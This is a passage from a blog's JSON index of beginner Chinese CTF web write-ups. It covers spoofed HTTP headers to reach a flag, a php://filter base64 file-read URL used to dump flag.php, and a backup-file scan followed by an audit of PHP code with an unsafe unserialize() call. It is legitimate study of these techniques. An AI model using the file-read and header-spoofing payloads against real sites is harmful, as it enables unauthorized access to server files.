text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: ja,zh-CN;q=0.9,zh;q=0.8 Cookie: power=ctfer Referer:newstarctf.com X-Real-IP:127.0.0.1 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 28 secret=n3wst4rCTF2023g00000d 响应就会把flag告诉你。\n3 觉得应该再读网络是怎样连接的这本书。\n一个学习的网站\n其实后面的都不难，把我绊倒的是POST /和POST /?ctf=1。\n好心寒，不小心把\u0026lt;br\u0026gt;打成\u0026lt;be\u0026gt;导致后面一片mk现原形。删删改改以为又抽风\u0026hellip;\n","date":"2023-10-17T12:55:32+08:00","permalink":"https://66lueflam144.github.io/p/6168dd2/","title":"2023 Newstar CTF Begin of HTTP"},{"content":"误入了一下代码审计。。。主要是我还做出来第一步了，所以有很大兴趣继续做下去。\n用开发者工具可以很容易看到被调成黑色与背景融为一体的you find me(大概这样)，其实也可以直接看到Archive_room.php这个文件名。\n进去以后点点secret然后没有什么收获。\n再来一次页面代码就很无聊了，所以排除再次ctrl+shift+I。\n抓包试试，\nRequest\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 GET /action.php HTTP/1.1 Host: 3b51e313-5282-4581-a4c7-2d3152b688a3.node4.buuoj.cn:81 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh,zh-TW;q=0.8,zh-HK;q=0.6,en-US;q=0.4,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Referer: http://3b51e313-5282-4581-a4c7-2d3152b688a3.node4.buuoj.cn:81/Archive_room.php Upgrade-Insecure-Requests: 1 Response\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 HTTP/1.1 302 Found Server: openresty Date: Wed, 13 Sep 2023 12:25:16 GMT Content-Type: text/html; charset=UTF-8 Connection: close Location: end.php X-Powered-By: PHP/7.3.11 Content-Length: 63 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;!-- secr3t.php --\u0026gt; \u0026lt;/html\u0026gt; 可以看到一个被注释了的php文件。进入该文件中，出现了一堆页面代码，不够有提示一个flag.php，所以我们又顺着进去看看，nothing。\n然后翻翻wp，说是filter伪协议。\n所以构造https://xxx/ser3t.php?file=php://filter/convert.base64-encode/resource=flag.php，进去之后下面那一串堪比乱码的字符如此显眼，加之我们构造的URL里面有个非常明显的base64，解码一下就是含有flag的页面代码。\n1 2 PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7Y2Q0MmNhNjUtYmNjNy00YjJiLWI0ZGQtYzYxNGZjZTBjMDI3fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo= base64解码之后：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;FLAG\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body style=\u0026#34;background-color:black;\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;h1 style=\u0026#34;font-family:verdana;color:red;text-align:center;\u0026#34;\u0026gt;啊哈！你找到我了！可是你看不到我QAQ~~~\u0026lt;/h1\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;p style=\u0026#34;font-family:arial;color:red;font-size:20px;text-align:center;\u0026#34;\u0026gt; \u0026lt;?php echo \u0026#34;我就在这里\u0026#34;; $flag = \u0026#39;flag{cd42ca65-bcc7-4b2b-b4dd-c614fce0c027}\u0026#39;; $secret = \u0026#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd\u0026#39; ?\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 就是这样子的效果，据说这叫代码审计。\nfilter伪协议\n一些filter伪协议技巧\n2023补充，是SSRF之file协议读取文件。\n","date":"2023-10-17T12:46:38+08:00","permalink":"https://66lueflam144.github.io/p/2849be8/","title":"2019 极客大挑战 SecretFile"},{"content":"界面让我想起来之前做过的一个SQL Injection题目，好像也是猫猫在玩毛线。\n1 尝试查看响应，直接http://xxx/flag.php或者http://xxx/index.php都得不到任何东西。然后再去看看说的话。\n“备份”。\n1 2 3 4 5 6 7 8 9 10 常用备份格式有 tar.gz，zip，rar，tar 常见的网站源码备份文件名： web，website，backup，back，www，wwwroot，temp 不过如果是类似我这样的人，文件命名就会很随意。\n随机排列组合上述“常用”，运气好，一会就有，运气不好可能没有。\n所以用扫描工具。开了dirsearch在后台扫描。看见了很多有上述后缀名的文件。\n不过扫描有点慢（可能因为开的全扫描），所以扫描的时候在这里打字。现在还没扫描好我打算先去吃晚饭了（bushi）。\n2 扫描结束，很多文件，不过可以根据文件大小来判断，dirsearch还贴心标色区别，所以就是那个万紫丛中一点绿的www.zip。\n在原网址输入后会下载一个zip文件，打开，里面重点有flag.php和'class.php两个文件（之前就尝试输入文件名但return all blank），用vscode打开，代码审计。（\u0026hellip;）\n3 dogdogdog 1 2 3 4 5 6 7 8 9 10 11 12 //flag.php \u0026lt;?php $flag = \u0026#39;Syc{dog_dog_dog_dog}\u0026#39;; ?\u0026gt; 刘备砸碗GIF\n再看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 //class.php \u0026lt;?php include \u0026#39;flag.php\u0026#39;; error_reporting(0); class Name{ private $username = \u0026#39;nonono\u0026#39;; private $password = \u0026#39;yesyes\u0026#39;; public function __construct($username,$password){ $this-\u0026gt;username = $username; $this-\u0026gt;password = $password; } function __wakeup(){ $this-\u0026gt;username = \u0026#39;guest\u0026#39;; } function __destruct(){ if ($this-\u0026gt;password != 100) { echo \u0026#34;\u0026lt;/br\u0026gt;NO!!!hacker!!!\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;You name is: \u0026#34;; echo $this-\u0026gt;username;echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;You password is: \u0026#34;; echo $this-\u0026gt;password;echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; die(); } if ($this-\u0026gt;username === \u0026#39;admin\u0026#39;) { global $flag; echo $flag; }else{ echo \u0026#34;\u0026lt;/br\u0026gt;hello my friend~~\u0026lt;/br\u0026gt;sorry i can\u0026#39;t give you the flag!\u0026#34;; die(); } } } ?\u0026gt; 大概是在讲有个private用户nonono和密码yesyes的设定，但外来输入会被__wakeup()重置为guest,但如果username是admin，就会返回flag。\n于是我就构建了?username=这样的，发现，不知道要跟在哪一个php后面\u0026hellip;\n所以找专业人士（等以后学了php审计再来更新）分析一下：\ninclude 'flag.php';：该语句用于包含一个名为 \u0026ldquo;flag.php\u0026rdquo; 的文件。这意味着代码中可能存在一个存储着敏感信息（如密钥、密码等）的变量。 error_reporting(0);：该语句禁止显示 PHP 错误报告。这可以防止攻击者通过错误信息来寻找潜在的安全漏洞。 class Name：定义了一个名为 Name 的类。 private $username = 'nonono'; 和 private $password = 'yesyes';：类中的私有成员变量 $username 和 $password 被初始化为默认值。 public function __construct($username, $password)：该构造函数接受两个参数 $username 和 $password，并将它们赋值给对应的成员变量。通过构造函数，实例化对象时可以传入不同的用户名和密码。 function __wakeup()：该魔术方法在反序列化操作时会被调用。在这个例子中，__wakeup() 方法将用户的用户名设置为 \u0026ldquo;guest\u0026rdquo;。 function __destruct()：该魔术方法在对象销毁时会被调用。在这段代码中，析构函数判断密码是否为 100。如果不是，则输出一条警告信息，并显示用户的用户名和密码（可能是攻击者恶意构造的）。如果密码为 100 并且用户名为 \u0026ldquo;admin\u0026rdquo;，则输出存储在 $flag 变量中的敏感信息；否则输出友好的信息，并结束程序。 catch me if you can 文件里面还有一个index.php，也看了看，\n1 2 3 4 5 6 7 8 9 10 11 12 //其中一段 \u0026lt;?php include \u0026#39;class.php\u0026#39;; $select = $_GET[\u0026#39;select\u0026#39;]; $res=unserialize(@$select); ?\u0026gt; include 'class.php';：该代码行将引入名为 \u0026ldquo;class.php\u0026rdquo; 的 PHP 文件。include 用于在 PHP 中包含指定的文件，以便在当前脚本中使用该文件中定义的类、函数和变量。 $select = $_GET['select'];：该代码行将从 GET 请求中获取名为 \u0026ldquo;select\u0026rdquo; 的参数值，并将其赋给变量 $select。GET 请求的参数通常是通过 URL 的查询字符串（query string）传递的，例如 http://example.com?select=value。 $res=unserialize(@$select);：该代码行将尝试对 $select 变量进行反序列化操作，并将结果赋给变量 $res。unserialize() 是一个 PHP 函数，用于将字符串转换回原始的 PHP 值（对象、数组等）。@ 符号用于抑制可能出现的错误或警告信息。 在这个过程中，它包含了一个潜在的安全风险。由于它使用了 unserialize() 函数来反序列化用户输入的数据，而用户可以通过构造恶意数据来执行任意的 PHP 代码。\n反序列化 参考\n具体的，我们下次再说，因为实在还没学。\n","date":"2023-10-16T12:42:43+08:00","permalink":"https://66lueflam144.github.io/p/dea4ca2/","title":"2019极客大挑战 PHP"}]